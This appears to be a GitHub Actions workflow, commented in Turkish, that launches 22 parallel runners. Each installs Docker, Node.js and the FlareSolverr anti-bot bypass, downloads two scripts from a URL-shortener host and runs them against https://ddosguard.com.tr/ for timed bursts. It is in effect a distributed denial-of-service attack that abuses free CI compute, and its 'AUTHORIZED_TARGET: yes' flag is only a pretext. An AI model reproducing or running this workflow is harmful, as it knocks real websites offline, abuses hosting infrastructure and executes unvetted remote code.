name: CRAW !
on:
  workflow_dispatch:

env:
  AUTHORIZED_TARGET: yes

jobs:
  vds:
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 22
      matrix:
        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22]
    
    steps:
      - name: Setup environment
        run: |
          sudo apt-get update
          # Docker kurulumu için gerekli paketler
          sudo apt-get install -y apt-transport-https ca-certificates curl gnupg lsb-release
          
          # Docker resmi GPG key
          curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
          
          # Docker repository ekle
          echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
          
          sudo apt-get update
          # containerd çakışmasını önle
          sudo apt-get remove -y containerd || true
          sudo apt-get install -y docker-ce docker-ce-cli containerd.io
          
          sudo systemctl start docker
          sudo systemctl enable docker
          
          # Node.js kurulumu
          curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
          sudo apt-get install -y nodejs
          
          # Gerekli paketler
          pip install requests

      - name: Download FlareSolverr
        run: |
          sudo docker pull flaresolverr/flaresolverr:latest
          sudo docker run -d --name flaresolverr -p 8191:8191 -e LOG_LEVEL=info --restart unless-stopped flaresolverr/flaresolverr:latest
          sleep 10
          echo "FlareSolverr started"

      - name: Download scripts
        run: |
          wget -q https://curl.by/VudqN/v1.js -O v1.js
          wget -q https://curl.by/3607K/v2.js -O v2.js
          chmod +x v1.js v2.js
          npm install axios

      - name: Run v1.js for 25 seconds
        env:
          AUTHORIZED_TARGET: yes
        run: |
          echo "Starting v1.js for 25 seconds..."
          timeout 25s node v1.js https://ddosguard.com.tr/ || echo "v1.js completed"
          echo "v1.js finished after 25 seconds"

      - name: Run v2.js for 225 seconds
        env:
          AUTHORIZED_TARGET: yes
        run: |
          echo "Starting v2.js for 225 seconds..."
          timeout 225s node v2.js https://ddosguard.com.tr/ 120 || echo "v2.js completed"
          echo "v2.js finished after 225 seconds"

      - name: Cleanup
        if: always()
        run: |
          echo "Job completed at $(date)"
          
          # Process'leri durdur
          pkill -f "v1.js" || true
          pkill -f "v2.js" || true
          
          # Docker temizliği
          sudo docker stop flaresolverr 2>/dev/null || true
          sudo docker rm flaresolverr 2>/dev/null || true
          
          echo "Cleanup completed"
